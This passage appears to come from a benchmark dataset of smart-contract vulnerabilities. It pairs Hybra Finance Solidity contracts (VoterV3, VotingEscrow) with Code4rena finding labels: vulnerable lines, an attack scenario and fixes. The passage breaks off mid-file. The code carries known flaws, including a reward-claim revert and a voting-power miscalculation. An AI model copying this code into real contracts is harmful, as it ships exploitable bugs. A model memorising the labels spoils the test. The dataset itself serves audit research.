*/\r\n    function setWithdrawFee(uint256 _fee) external onlyOwner {\r\n        require(_fee >= MIN_WITHDRAW_FEE && _fee <= MAX_WITHDRAW_FEE, \"Invalid fee\");\r\n        withdrawFee = _fee;\r\n    }\r\n\r\n\r\n    function setHeadNotWithdrawTime(uint256 _time) external onlyOwner {\r\n        head_not_withdraw_time = _time;\r\n    }\r\n\r\n    function setTailNotWithdrawTime(uint256 _time) external onlyOwner {\r\n        tail_not_withdraw_time = _time;\r\n    }\r\n    \r\n    /**\r\n     * @notice Set the swapper module\r\n     * @param _swapper Address of the swapper module\r\n     */\r\n    function setSwapper(address _swapper) external onlyOwner {\r\n        require(_swapper != address(0), \"Invalid swapper\");\r\n        address oldSwapper = address(swapper);\r\n        swapper = ISwapper(_swapper);\r\n        emit SwapperUpdated(oldSwapper, _swapper);\r\n    }\r\n    \r\n    /**\r\n     * @notice Set the team address\r\n     */\r\n    function setTeam(address _team) external onlyOwner {\r\n        require(_team != address(0), \"Invalid team\");\r\n        Team = _team;\r\n    }\r\n    \r\n    /**\r\n     * @notice Emergency unlock for a user (owner only)\r\n     */\r\n    function emergencyUnlock(address user) external onlyOperator {\r\n        delete userLocks[user];\r\n        lockedBalance[user] = 0;\r\n        emit EmergencyUnlock(user);\r\n    }\r\n\r\n    /**\r\n     * @notice Get user's locks info\r\n     */\r\n    function getUserLocks(address user) external view returns (UserLock[] memory) {\r\n        return userLocks[user];\r\n    }\r\n    \r\n    \r\n \r\n    \r\n  \r\n    \r\n    /**\r\n     * @notice Set operator address\r\n     */\r\n    function setOperator(address _operator) external onlyOwner {\r\n        require(_operator != address(0), \"Invalid operator\");\r\n        address oldOperator = operator;\r\n        operator = _operator;\r\n        emit OperatorUpdated(oldOperator, _operator);\r\n    }\r\n    \r\n\r\n\r\n\r\n    \r\n    /**\r\n     * @notice Get veNFT lock end time\r\n     */\r\n    function getLockEndTime() external view returns (uint256) {\r\n        if (veTokenId == 0) {\r\n            return 0;\r\n        }\r\n        IVotingEscrow.LockedBalance memory locked = IVotingEscrow(votingEscrow).locked(veTokenId);\r\n        return uint256(locked.end);\r\n    }\r\n\r\n    /**\r\n     * @notice Internal helper to safely extend lock to maximum duration\r\n     * @dev Calculates exact duration needed to reach max allowed unlock time\r\n     */\r\n    function _extendLockToMax() internal {\r\n        if (veTokenId == 0) return;\r\n\r\n        IVotingEscrow.LockedBalance memory locked = IVotingEscrow(votingEscrow).locked(veTokenId);\r\n        if (locked.isPermanent || locked.end <= block.timestamp) return;\r\n\r\n        uint256 maxUnlockTime = ((block.timestamp + HybraTimeLibrary.MAX_LOCK_DURATION) / HybraTimeLibrary.WEEK) * HybraTimeLibrary.WEEK;\r\n\r\n        // Only extend if difference is more than 2 hours\r\n        if (maxUnlockTime > locked.end + 2 hours) {\r\n            try IVotingEscrow(votingEscrow).increase_unlock_time(veTokenId, HybraTimeLibrary.MAX_LOCK_DURATION) {\r\n                // Extension successful\r\n            } catch {\r\n                // Extension failed, continue without error\r\n                // This can happen if already at max possible time or other constraints\r\n            }\r\n        }\r\n    }\r\n\r\n}",
            "vulnerable_lines": [
                370
            ],
            "vulnerable_functions": [
                "claimRewards"
            ]
        },
        "context_files": [
            {
                "path": "ve33/contracts/VoterV3.sol",
                "content": "// SPDX-License-Identifier: MIT\r\npragma solidity ^0.8.13;\r\n\r\nimport './libraries/Math.sol';\r\nimport './interfaces/IBribe.sol';\r\nimport './interfaces/IERC20.sol';\r\nimport './interfaces/IPairInfo.sol';\r\nimport './interfaces/IPairFactory.sol';\r\nimport './interfaces/IVotingEscrow.sol';\r\nimport './interfaces/IGaugeManager.sol';\r\nimport './interfaces/IPermissionsRegistry.sol';\r\nimport './interfaces/ITokenHandler.sol';\r\nimport {HybraTimeLibrary} from \"./libraries/HybraTimeLibrary.sol\";\r\nimport \"@openzeppelin/contracts-upgradeable/access/OwnableUpgradeable.sol\";\r\nimport \"@openzeppelin/contracts-upgradeable/security/ReentrancyGuardUpgradeable.sol\";\r\nimport \"@openzeppelin/contracts-upgradeable/token/ERC20/utils/SafeERC20Upgradeable.sol\";\r\nimport \"@openzeppelin/contracts-upgradeable/token/ERC20/IERC20Upgradeable.sol\";\r\n\r\ncontract VoterV3 is OwnableUpgradeable, ReentrancyGuardUpgradeable {\r\n    using SafeERC20Upgradeable for IERC20Upgradeable;\r\n\r\n    address public _ve;                                         // the ve token that governs these contracts\r\n    address internal base;                                      // $the token\r\n    address public permissionRegistry;                          // registry to check accesses\r\n    address public tokenHandler;                     \r\n    uint256 public maxVotingNum;\r\n    uint public EPOCH_DURATION;\r\n    uint256 internal constant MIN_VOTING_NUM = 10;\r\n    IGaugeManager public gaugeManager;\r\n    \r\n    mapping(uint256 => mapping(address => uint256)) public votes;  // nft      => pool     => votes\r\n    mapping(uint256 => address[]) public poolVote;                 // nft      => pools\r\n\r\n    mapping(address => uint256) public weights;\r\n    uint256 public totalWeight;\r\n    mapping(uint256 => uint256) public usedWeights;\r\n\r\n    mapping(uint256 => uint256) public lastVoted;                     // nft      => timestamp of last vote (this is shifted to thursday of that epoc)\r\n    mapping(uint256 => uint256) public lastVotedTimestamp;            // nft      => timestamp of last vote\r\n\r\n    event Voted(address indexed voter, uint256 tokenId, uint256 weight);\r\n    event Abstained(uint256 tokenId, uint256 weight);\r\n    event SetPermissionRegistry(address indexed old, address indexed latest);\r\n\r\n    constructor() {}\r\n\r\n    // function initialize(address __ve, address _pairFactory, address  _gaugeFactory, address _bribes, address _tokenHandler) initializer public {\r\n    function initialize(\r\n        address __ve,\r\n        address _tokenHandler,\r\n        address _gaugeManager,\r\n        address _permissionRegistry\r\n    ) public initializer {\r\n        __Ownable_init();\r\n        __ReentrancyGuard_init();\r\n        _ve = __ve;\r\n        base = IVotingEscrow(__ve).token();\r\n        gaugeManager = IGaugeManager(_gaugeManager);\r\n        permissionRegistry = _permissionRegistry;\r\n        tokenHandler = _tokenHandler;\r\n        maxVotingNum = 30;\r\n        EPOCH_DURATION = HybraTimeLibrary.WEEK;\r\n    }\r\n \r\n    /* -----------------------------------------------------------------------------\r\n    --------------------------------------------------------------------------------\r\n    --------------------------------------------------------------------------------\r\n                                    MODIFIERS\r\n    --------------------------------------------------------------------------------\r\n    --------------------------------------------------------------------------------\r\n    ----------------------------------------------------------------------------- */\r\n\r\n    modifier VoterAdmin() {\r\n        require(IPermissionsRegistry(permissionRegistry).hasRole(\"VOTER_ADMIN\",msg.sender), 'VOTER_ADMIN');\r\n        _;\r\n    }\r\n\r\n    modifier Governance() {\r\n        require(IPermissionsRegistry(permissionRegistry).hasRole(\"GOVERNANCE\",msg.sender), 'GOVERNANCE');\r\n        _;\r\n    }\r\n\r\n    modifier GenesisManager() {\r\n        require(IPermissionsRegistry(permissionRegistry).hasRole(\"GENESIS_MANAGER\", msg.sender), 'GENESIS_MANAGER');\r\n        _;\r\n    }\r\n\r\n    /* -----------------------------------------------------------------------------\r\n    --------------------------------------------------------------------------------\r\n    --------------------------------------------------------------------------------\r\n                                    VoterAdmin\r\n    --------------------------------------------------------------------------------\r\n    --------------------------------------------------------------------------------\r\n    ----------------------------------------------------------------------------- */\r\n\r\n \r\n\r\n    /// @notice Set a new PermissionRegistry\r\n    function setPermissionsRegistry(address _permissionRegistry) external VoterAdmin {\r\n        require(_permissionRegistry.code.length > 0, \"CODELEN\");\r\n        require(_permissionRegistry != address(0), \"ZA\");\r\n        emit SetPermissionRegistry(permissionRegistry, _permissionRegistry);\r\n        permissionRegistry = _permissionRegistry;\r\n    }\r\n\r\n    function setMaxVotingNum(uint256 _maxVotingNum) external VoterAdmin {\r\n        require (_maxVotingNum >= MIN_VOTING_NUM, \"LOW_VOTE\");\r\n        maxVotingNum = _maxVotingNum;\r\n    }\r\n\r\n\r\n    /* -----------------------------------------------------------------------------\r\n    --------------------------------------------------------------------------------\r\n    --------------------------------------------------------------------------------\r\n                                    USER INTERACTION\r\n    --------------------------------------------------------------------------------\r\n    --------------------------------------------------------------------------------\r\n    ----------------------------------------------------------------------------- */\r\n\r\n    \r\n    /// @notice Reset the votes of a given TokenID\r\n    function reset(uint256 _tokenId) external onlyNewEpoch(_tokenId) nonReentrant {\r\n        require(IVotingEscrow(_ve).isApprovedOrOwner(msg.sender, _tokenId), \"NAO\");\r\n        _reset(_tokenId);\r\n        IVotingEscrow(_ve).abstain(_tokenId);\r\n    }\r\n\r\n    function _reset(uint256 _tokenId) internal {\r\n        address[] storage _poolVote = poolVote[_tokenId];\r\n        uint256 _poolVoteCnt = _poolVote.length;\r\n        uint256 _totalWeight = 0;\r\n\r\n        for (uint256 i = 0; i < _poolVoteCnt; i ++) {\r\n            address _pool = _poolVote[i];\r\n            uint256 _votes = votes[_tokenId][_pool];\r\n\r\n            if (_votes != 0) {\r\n                weights[_pool] -= _votes;\r\n\r\n                votes[_tokenId][_pool] -= _votes;\r\n                address internal_bribe = gaugeManager.fetchInternalBribeFromPool(_pool);\r\n                address external_bribe = gaugeManager.fetchExternalBribeFromPool(_pool);\r\n                IBribe(internal_bribe).withdraw(uint256(_votes), _tokenId);\r\n                IBribe(external_bribe).withdraw(uint256(_votes), _tokenId);\r\n\r\n                // decrease totalWeight irrespective of gauge is killed/alive for this current pool\r\n                _totalWeight += _votes;\r\n                \r\n                emit Abstained(_tokenId, _votes);\r\n            }\r\n        }\r\n        totalWeight -= _totalWeight;\r\n        usedWeights[_tokenId] = 0;\r\n        delete poolVote[_tokenId];\r\n    }\r\n\r\n    /// @notice Recast the saved votes of a given TokenID\r\n    function poke(uint256 _tokenId) external nonReentrant {\r\n        uint256 _timestamp = block.timestamp;\r\n        if (_timestamp <= HybraTimeLibrary.epochVoteStart(_timestamp)){\r\n            revert(\"DW\");\r\n        }\r\n        require(IVotingEscrow(_ve).isApprovedOrOwner(msg.sender, _tokenId) || msg.sender == _ve, \"NAO||VE\");\r\n        address[] memory _poolVote = poolVote[_tokenId];\r\n        uint256 _poolCnt = _poolVote.length;\r\n        uint256[] memory _weights = new uint256[](_poolCnt);\r\n\r\n        for (uint256 i = 0; i < _poolCnt; i ++) {\r\n            _weights[i] = votes[_tokenId][_poolVote[i]];\r\n        } \r\n\r\n        _vote(_tokenId, _poolVote, _weights);\r\n    }\r\n\r\n    \r\n    /// @notice Vote for pools\r\n    /// @param  _tokenId    veNFT tokenID used to vote\r\n    /// @param  _poolVote   array of LPs addresses to vote  (eg.: [sAMM usdc-usdt   , sAMM busd-usdt, vAMM wbnb-the ,...])\r\n    /// @param  _weights    array of weights for each LPs   (eg.: [10               , 90            , 45             ,...])  \r\n    function vote(uint256 _tokenId, address[] calldata _poolVote, uint256[] calldata _weights) \r\n        external onlyNewEpoch(_tokenId) nonReentrant {\r\n        require(IVotingEscrow(_ve).isApprovedOrOwner(msg.sender, _tokenId), \"NAO\");\r\n        require(_poolVote.length == _weights.length, \"MISMATCH_LEN\");\r\n        require(_poolVote.length <= maxVotingNum, \"EXCEEDS\");\r\n        uint256 _timestamp = block.timestamp;\r\n      \r\n        _vote(_tokenId, _poolVote, _weights);\r\n        lastVoted[_tokenId] = HybraTimeLibrary.epochStart(block.timestamp) + 1;\r\n        lastVotedTimestamp[_tokenId] = block.timestamp;\r\n    }\r\n    \r\n    function _vote(uint256 _tokenId, address[] memory _poolVote, uint256[] memory _weights) internal {\r\n        _reset(_tokenId);\r\n        uint256 _poolCnt = _poolVote.length;\r\n        uint256 _weight = IVotingEscrow(_ve).balanceOfNFT(_tokenId);\r\n        uint256 _totalVoteWeight = 0;\r\n        uint256 _usedWeight = 0;\r\n\r\n        for (uint i = 0; i < _poolCnt; i++) {\r\n\r\n            if(gaugeManager.isGaugeAliveForPool(_poolVote[i])) _totalVoteWeight += _weights[i];\r\n        }\r\n\r\n        for (uint256 i = 0; i < _poolCnt; i++) {\r\n            address _pool = _poolVote[i];\r\n\r\n            if (gaugeManager.isGaugeAliveForPool(_pool)) {\r\n                uint256 _poolWeight = _weights[i] * _weight / _totalVoteWeight;\r\n\r\n                require(votes[_tokenId][_pool] == 0, \"ZV\");\r\n                require(_poolWeight != 0, \"ZV\");\r\n\r\n                poolVote[_tokenId].push(_pool);\r\n                weights[_pool] += _poolWeight;\r\n\r\n                votes[_tokenId][_pool] = _poolWeight;\r\n                address internal_bribe = gaugeManager.fetchInternalBribeFromPool(_pool);\r\n                address external_bribe = gaugeManager.fetchExternalBribeFromPool(_pool);\r\n                \r\n                IBribe(internal_bribe).deposit(uint256(_poolWeight), _tokenId);\r\n                IBribe(external_bribe).deposit(uint256(_poolWeight), _tokenId);\r\n                \r\n                _usedWeight += _poolWeight;\r\n                emit Voted(msg.sender, _tokenId, _poolWeight);\r\n            }\r\n        }\r\n        if (_usedWeight > 0) IVotingEscrow(_ve).voting(_tokenId);\r\n        totalWeight += _usedWeight;\r\n        usedWeights[_tokenId] = _usedWeight;\r\n    }\r\n\r\n\r\n    modifier onlyNewEpoch(uint256 _tokenId) {\r\n        // ensure new epoch since last vote\r\n        if (HybraTimeLibrary.epochStart(block.timestamp) <= lastVoted[_tokenId]) revert(\"VOTED\");\r\n        if (block.timestamp <= HybraTimeLibrary.epochVoteStart(block.timestamp)) revert(\"DW\");\r\n        _;\r\n    }\r\n   \r\n    /* -----------------------------------------------------------------------------\r\n    --------------------------------------------------------------------------------\r\n    --------------------------------------------------------------------------------\r\n                                    VIEW FUNCTIONS\r\n    --------------------------------------------------------------------------------\r\n    --------------------------------------------------------------------------------\r\n    ----------------------------------------------------------------------------- */\r\n\r\n    /// @notice view the total length of the pools\r\n    function length() external view returns (uint256) {\r\n        return gaugeManager.pools().length;\r\n    }\r\n\r\n    /// @notice view the total length of the voted pools given a tokenId\r\n    function poolVoteLength(uint256 tokenId) external view returns(uint256) { \r\n        return poolVote[tokenId].length;\r\n    }\r\n\r\n    function setGaugeManager(address _gaugeManager) external VoterAdmin {\r\n        require(_gaugeManager != address(0));\r\n        gaugeManager = IGaugeManager(_gaugeManager);\r\n    }\r\n    \r\n}",
                "relevance": "VoterV3 holds the poolVote mapping that GovernanceHYBR tries to call as a getter function."
            }
        ],
        "call_flow": "claimRewards() -> IVoter.poolVote(veTokenId) [invalid call] -> revert",
        "context_hint": "Incorrect interface usage treats mapping as function, causing revert on reward claims.",
        "is_vulnerable": true
    },
    {
        "id": "gs_c4_2025-10-hybra-finance_M08",
        "subset": "gold_standard",
        "language": "solidity",
        "chain": "ethereum",
        "source_platform": "code4rena",
        "source_report": "2025-10-hybra-finance",
        "source_finding_id": "M-08",
        "report_url": "https://code4rena.com/reports/2025-10-hybra-finance",
        "github_repo_url": "https://github.com/code-423n4/2025-10-hybra-finance",
        "contest_date": "2025-10-06",
        "severity": "medium",
        "vulnerability_type": "logic_error",
        "difficulty_tier": 3,
        "context_level": "single_file",
        "finding_title": "Incorrect voting power calculation when create_lock and increase_amount are called in the same transaction",
        "finding_description": "`_checkpoint` creates a new epoch with the same timestamp for `increase_amount`, ignoring the new lock in `balanceOfNFT`, reducing voting power.",
        "attack_scenario": "A test locks 500e18, increases by 500e18 in one tx, and shows reduced bribe rewards compared to separate locks.",
        "fix_description": "In `_checkpoint`, overwrite the latest point if timestamps match, else append a new one. Status: Mitigation confirmed.",
        "primary_file": {
            "path": "ve33/contracts/VotingEscrow.sol",
            "content": "// SPDX-License-Identifier: MIT\r\npragma solidity 0.8.13;\r\n\r\nimport {IERC721, IERC721Metadata} from \"@openzeppelin/contracts/token/ERC721/extensions/IERC721Metadata.sol\";\r\nimport {IERC721Receiver} from \"@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol\";\r\nimport {IERC20} from \"./interfaces/IERC20.sol\";\r\nimport \"./interfaces/IHybra.sol\";\r\nimport {IHybraVotes} from \"./interfaces/IHybraVotes.sol\";\r\nimport {IVeArtProxy} from \"./interfaces/IVeArtProxy.sol\";\r\nimport {IVotingEscrow} from \"./interfaces/IVotingEscrow.sol\";\r\nimport {IVoter} from \"./interfaces/IVoter.sol\";\r\nimport {HybraTimeLibrary} from \"./libraries/HybraTimeLibrary.sol\";\r\nimport {VotingDelegationLib} from \"./libraries/VotingDelegationLib.sol\";\r\nimport {VotingBalanceLogic} from \"./libraries/VotingBalanceLogic.sol\";\r\n\r\n/// @title Voting Escrow\r\n/// @notice veNFT implementation that escrows ERC-20 tokens in the form of an ERC-721 NFT\r\n/// @notice Votes have a weight depending on time, so that users are committed to the future of (whatever they are voting for)\r\n/// @author Modified from Solidly (https://github.com/solidlyexchange/solidly/blob/master/contracts/ve.sol)\r\n/// @author Modified from Curve (https://github.com/curvefi/curve-dao-contracts/blob/master/contracts/VotingEscrow.vy)\r\n/// @author Modified from Nouns DAO (https://github.com/withtally/my-nft-dao-project/blob/main/contracts/ERC721Checkpointable.sol)\r\n/// @dev Vote weight decays linearly over time. Lock time cannot be more than `MAXTIME` (2 years).\r\ncontract VotingEscrow is IERC721, IERC721Metadata, IHybraVotes {\r\n    enum DepositType {\r\n        DEPOSIT_FOR_TYPE,\r\n        CREATE_LOCK_TYPE,\r\n        INCREASE_LOCK_AMOUNT,\r\n        INCREASE_UNLOCK_TIME\r\n    }\r\n\r\n    /*//////////////////////////////////////////////////////////////\r\n                                 EVENTS\r\n    //////////////////////////////////////////////////////////////*/\r\n\r\n    event Deposit(\r\n        address indexed provider,\r\n        uint tokenId,\r\n        uint value,\r\n        uint indexed locktime,\r\n        DepositType deposit_type,\r\n        uint ts\r\n    );\r\n\r\n    event Merge(\r\n        address indexed _sender,\r\n        uint256 indexed _from,\r\n        uint256 indexed _to,\r\n        uint256 _amountFrom,\r\n        uint256 _amountTo,\r\n        uint256 _amountFinal,\r\n        uint256 _locktime,\r\n        uint256 _ts\r\n    );\r\n    event Split(\r\n        uint256 indexed _from,\r\n        uint256 indexed _tokenId1,\r\n        uint256 indexed _tokenId2,\r\n        address _sender,\r\n        uint256 _splitAmount1,\r\n        uint256 _splitAmount2,\r\n        uint256 _locktime,\r\n        uint256 _ts\r\n    );\r\n    \r\n    event MultiSplit(\r\n        uint256 indexed _from,\r\n        uint256[] _newTokenIds,\r\n        address _sender,\r\n        uint256[] _amounts,\r\n        uint256 _locktime,\r\n        uint256 _ts\r\n    );\r\n    \r\n    event MetadataUpdate(uint256 _tokenId);\r\n    event BatchMetadataUpdate(uint256 _fromTokenId, uint256 _toTokenId);\r\n\r\n    event Withdraw(address indexed provider, uint tokenId, uint value, uint ts);\r\n    event LockPermanent(address indexed _owner, uint256 indexed _tokenId, uint256 amount, uint256 _ts);\r\n    event UnlockPermanent(address indexed _owner, uint256 indexed _tokenId, uint256 amount, uint256 _ts);\r\n    event Supply(uint prevSupply, uint supply);\r\n\r\n    /*//////////////////////////////////////////////////////////////\r\n                               CONSTRUCTOR\r\n    //////////////////////////////////////////////////////////////*/\r\n\r\n    address public immutable token;\r\n    address public voter;\r\n    address public team;\r\n    address public artProxy;\r\n    // address public burnTokenAddress=0x000000000000000000000000000000000000dEaD;\r\n\r\n    uint public PRECISISON = 10000;\r\n\r\n    /// @dev Mapping of interface id to bool about whether or not it's supported\r\n    mapping(bytes4 => bool) internal supportedInterfaces;\r\n    mapping(uint => bool) internal isPartnerVeNFT;\r\n\r\n    /// @dev ERC165 interface ID of ERC165\r\n    bytes4 internal constant ERC165_INTERFACE_ID = 0x01ffc9a7;\r\n\r\n    /// @dev ERC165 interface ID of ERC721\r\n    bytes4 internal constant ERC721_INTERFACE_ID = 0x80ac58cd;\r\n\r\n    /// @dev ERC165 interface ID of ERC721Metadata\r\n    bytes4 internal constant ERC721_METADATA_INTERFACE_ID = 0x5b5e139f;\r\n\r\n    /// @dev Current count of token\r\n    uint internal tokenId;\r\n\r\n    uint internal WEEK;\r\n\r\n    uint internal MAXTIME;\r\n    int128 internal iMAXTIME;\r\n    IHybra public _hybr;\r\n\r\n    // Instance of the library's storage struct\r\n    VotingDelegationLib.Data private cpData;\r\n\r\n    VotingBalanceLogic.Data private votingBalanceLogicData;\r\n\r\n    /// @notice Contract constructor\r\n    /// @param token_addr `BLACK` token address\r\n    constructor(address token_addr, address art_proxy) {\r\n        token = token_addr;\r\n        voter = msg.sender;\r\n        team = msg.sender;\r\n        artProxy = art_proxy;\r\n        WEEK = HybraTimeLibrary.WEEK;\r\n        MAXTIME = HybraTimeLibrary.MAX_LOCK_DURATION;\r\n        iMAXTIME = int128(int256(HybraTimeLibrary.MAX_LOCK_DURATION));\r\n\r\n        votingBalanceLogicData.point_history[0].blk = block.number;\r\n        votingBalanceLogicData.point_history[0].ts = block.timestamp;\r\n\r\n        supportedInterfaces[ERC165_INTERFACE_ID] = true;\r\n        supportedInterfaces[ERC721_INTERFACE_ID] = true;\r\n        supportedInterfaces[ERC721_METADATA_INTERFACE_ID] = true;\r\n        _hybr = IHybra(token);\r\n\r\n        // mint-ish\r\n        emit Transfer(address(0), address(this), tokenId);\r\n        // burn-ish\r\n        emit Transfer(address(this), address(0), tokenId);\r\n    }\r\n\r\n    /*//////////////////////////////////////////////////////////////\r\n                                MODIFIERS\r\n    //////////////////////////////////////////////////////////////*/\r\n\r\n    /// @dev reentrancy guard\r\n    uint8 internal constant _not_entered = 1;\r\n    uint8 internal constant _entered = 2;\r\n    uint8 internal _entered_state = 1;\r\n    modifier nonreentrant() {\r\n        require(_entered_state == _not_entered);\r\n        _entered_state = _entered;\r\n        _;\r\n        _entered_state = _not_entered;\r\n    }\r\n\r\n    modifier notPartnerNFT(uint256 _tokenId) {\r\n        require(!isPartnerVeNFT[_tokenId], \"PNFT\");\r\n        _;\r\n    }\r\n\r\n    modifier splitAllowed(uint _from) {\r\n        require(canSplit[msg.sender] || canSplit[address(0)], \"!SPLIT\");\r\n        require(attachments[_from] == 0 && !voted[_from], \"ATT\");\r\n        require(_isApprovedOrOwner(msg.sender, _from), \"NAO\");\r\n        _;\r\n    }\r\n\r\n    \r\n\r\n    /*///////////////////////////////////////////////////////////////\r\n                             METADATA STORAGE\r\n    //////////////////////////////////////////////////////////////*/\r\n\r\n    string constant public name = \"veHYBR\";\r\n    string constant public symbol = \"veHYBR\";\r\n    string constant public version = \"1.0.0\";\r\n    uint8 constant public decimals = 18;\r\n\r\n    function setTeam(address _team) external {\r\n        require(msg.sender == team);\r\n        team = _team;\r\n    }\r\n\r\n    function setArtProxy(address _proxy) external {\r\n        require(msg.sender == team);\r\n        artProxy = _proxy;\r\n        emit BatchMetadataUpdate(0, type(uint256).max);\r\n    }\r\n\r\n    /// @param _tokenId The token ID to modify\r\n    /// @param _isPartner Whether this should be a partner veNFT\r\n    function setPartnerVeNFT(uint _tokenId, bool _isPartner) external {\r\n        require(msg.sender == team, \"NA\");\r\n        require(idToOwner[_tokenId] != address(0), \"DNE\");\r\n        isPartnerVeNFT[_tokenId] = _isPartner;\r\n    }\r\n\r\n    /// @dev Returns current token URI metadata\r\n    /// @param _tokenId Token ID to fetch URI for.\r\n    function tokenURI(uint _tokenId) external view returns (string memory) {\r\n        require(idToOwner[_tokenId] != address(0), \"DNE\");\r\n        IVotingEscrow.LockedBalance memory _locked = locked[_tokenId];\r\n        \r\n        return IVeArtProxy(artProxy)._tokenURI(_tokenId,VotingBalanceLogic.balanceOfNFT(_tokenId, block.timestamp, votingBalanceLogicData),_locked.end,uint(int256(_locked.amount)));\r\n    }\r\n\r\n    /*//////////////////////////////////////////////////////////////\r\n                      ERC721 BALANCE/OWNER STORAGE\r\n    //////////////////////////////////////////////////////////////*/\r\n\r\n    /// @dev Mapping from NFT ID to the address that owns it.\r\n    mapping(uint => address) internal idToOwner;\r\n\r\n    /// @dev Mapping from owner address to count of his tokens.\r\n    mapping(address => uint) internal ownerToNFTokenCount;\r\n\r\n    /// @dev Returns the address of the owner of the NFT.\r\n    /// @param _tokenId The identifier for an NFT.\r\n    function ownerOf(uint _tokenId) public view returns (address) {\r\n        return idToOwner[_tokenId];\r\n    }\r\n\r\n    function ownerToNFTokenCountFn(address owner) public view returns (uint) {\r\n        \r\n        return ownerToNFTokenCount[owner];\r\n    }\r\n\r\n    /// @dev Returns the number of NFTs owned by `_owner`.\r\n    ///      Throws if `_owner` is the zero address. NFTs assigned p to the zero address are considered invalid.\r\n    /// @param _owner Address for whom to query the balance.\r\n    function _balance(address _owner) internal view returns (uint) {\r\n        return ownerToNFTokenCount[_owner];\r\n    }\r\n\r\n    /// @dev Returns the number of NFTs owned by `_owner`.\r\n    ///      Throws if `_owner` is the zero address. NFTs assigned to the zero address are considered invalid.\r\n    /// @param _owner Address for whom to query the balance.\r\n    function balanceOf(address _owner) external view returns (uint) {\r\n        return _balance(_owner);\r\n    }\r\n\r\n    /*//////////////////////////////////////////////////////////////\r\n                         ERC721 APPROVAL STORAGE\r\n    //////////////////////////////////////////////////////////////*/\r\n\r\n    /// @dev Mapping from NFT ID to approved address.\r\n    mapping(uint => address) internal idToApprovals;\r\n\r\n    /// @dev Mapping from owner address to mapping of operator addresses.\r\n    mapping(address => mapping(address => bool)) internal ownerToOperators;\r\n\r\n    mapping(uint => uint) public ownership_change;\r\n\r\n    /// @dev Get the approved address for a single NFT.\r\n    /// @param _tokenId ID of the NFT to query the approval of.\r\n    function getApproved(uint _tokenId) external view returns (address) {\r\n        return idToApprovals[_tokenId];\r\n    }\r\n\r\n    /// @dev Checks if `_operator` is an approved operator for `_owner`.\r\n    /// @param _owner The address that owns the NFTs.\r\n    /// @param _operator The address that acts on behalf of the owner.\r\n    function isApprovedForAll(address _owner, address _operator) external view returns (bool) {\r\n        return (ownerToOperators[_owner])[_operator];\r\n    }\r\n\r\n    /*//////////////////////////////////////////////////////////////\r\n                              ERC721 LOGIC\r\n    //////////////////////////////////////////////////////////////*/\r\n\r\n    /// @dev Set or reaffirm the approved address for an NFT. The zero address indicates there is no approved address.\r\n    ///      Throws unless `msg.sender` is the current NFT owner, or an authorized operator of the current owner.\r\n    ///      Throws if `_tokenId` is not a valid NFT. (NOTE: This is not written the EIP)\r\n    ///      Throws if `_approved` is the current owner. (NOTE: This is not written the EIP)\r\n    /// @param _approved Address to be approved for the given NFT ID.\r\n    /// @param _tokenId ID of the token to be approved.\r\n    function approve(address _approved, uint _tokenId) public {\r\n        address owner = idToOwner[_tokenId];\r\n        // Throws if `_tokenId` is not a valid NFT\r\n        require(owner != address(0), \"ZA\");\r\n        // Throws if `_approved` is the current owner\r\n        require(_approved != owner, \"IA\");\r\n        // Check requirements\r\n        bool senderIsOwner = (idToOwner[_tokenId] == msg.sender);\r\n        bool senderIsApprovedForAll = (ownerToOperators[owner])[msg.sender];\r\n        require(senderIsOwner || senderIsApprovedForAll, \"NAO\");\r\n        // Set the approval\r\n        idToApprovals[_tokenId] = _approved;\r\n        emit Approval(owner, _approved, _tokenId);\r\n    }\r\n\r\n    /// @dev Enables or disables approval for a third party (\"operator\") to manage all of\r\n    ///      `msg.sender`'s assets. It also emits the ApprovalForAll event.\r\n    ///      Throws if `_operator` is the `msg.sender`. (NOTE: This is not written the EIP)\r\n    /// @notice This works even if sender doesn't own any tokens at the time.\r\n    /// @param _operator Address to add to the set of authorized operators.\r\n    /// @param _approved True if the operators is approved, false to revoke approval.\r\n    function setApprovalForAll(address _operator, bool _approved) external {\r\n        // Throws if `_operator` is the `msg.sender`\r\n        assert(_operator != msg.sender);\r\n        ownerToOperators[msg.sender][_operator] = _approved;\r\n        emit ApprovalForAll(msg.sender, _operator, _approved);\r\n    }\r\n\r\n    /* TRANSFER FUNCTIONS */\r\n    /// @dev Clear an approval of a given address\r\n    ///      Throws if `_owner` is not the current owner.\r\n    function _clearApproval(address _owner, uint _tokenId) internal {\r\n        // Throws if `_owner` is not the current owner\r\n        assert(idToOwner[_tokenId] == _owner);\r\n        if (idToApprovals[_tokenId] != address(0)) {\r\n            // Reset approvals\r\n            idToApprovals[_tokenId] = address(0);\r\n        }\r\n    }\r\n\r\n    /// @dev Returns whether the given spender can transfer a given token ID\r\n    /// @param _spender address of the spender to query\r\n    /// @param _tokenId uint ID of the token to be transferred\r\n    /// @return bool whether the msg.sender is approved for the given token ID, is an operator of the owner, or is the owner of the token\r\n    function _isApprovedOrOwner(address _spender, uint _tokenId) internal view returns (bool) {\r\n        address owner = idToOwner[_tokenId];\r\n        bool spenderIsOwner = owner == _spender;\r\n        bool spenderIsApproved = _spender == idToApprovals[_tokenId];\r\n        bool spenderIsApprovedForAll = (ownerToOperators[owner])[_spender];\r\n        return spenderIsOwner || spenderIsApproved || spenderIsApprovedForAll;\r\n    }\r\n\r\n    function isApprovedOrOwner(address _spender, uint _tokenId) external view returns (bool) {\r\n        return _isApprovedOrOwner(_spender, _tokenId);\r\n    }\r\n\r\n    /// @dev Exeute transfer of a NFT.\r\n    ///      Throws unless `msg.sender` is the current owner, an authorized operator, or the approved\r\n    ///      address for this NFT. (NOTE: `msg.sender` not allowed in internal function so pass `_sender`.)\r\n    ///      Throws if `_to` is the zero address.\r\n    ///      Throws if `_from` is not the current owner.\r\n    ///      Throws if `_tokenId` is not a valid NFT.\r\n    function _transferFrom(\r\n        address _from,\r\n        address _to,\r\n        uint _tokenId,\r\n        address _sender\r\n    ) internal notPartnerNFT(_tokenId) {\r\n        require(attachments[_tokenId] == 0 && !voted[_tokenId], \"ATT\");\r\n        // Check requirements\r\n        require(_isApprovedOrOwner(_sender, _tokenId), \"NAO\");\r\n\r\n        // Clear approval. Throws if `_from` is not the current owner\r\n        _clearApproval(_from, _tokenId);\r\n        // Remove NFT. Throws if `_tokenId` is not a valid NFT\r\n        _removeTokenFrom(_from, _tokenId);\r\n        // auto re-delegate\r\n        VotingDelegationLib.moveTokenDelegates(cpData, delegates(_from), delegates(_to), _tokenId, ownerOf);\r\n        // Add NFT\r\n        _addTokenTo(_to, _tokenId);\r\n        // Set the block of ownership transfer (for Flash NFT protection)\r\n        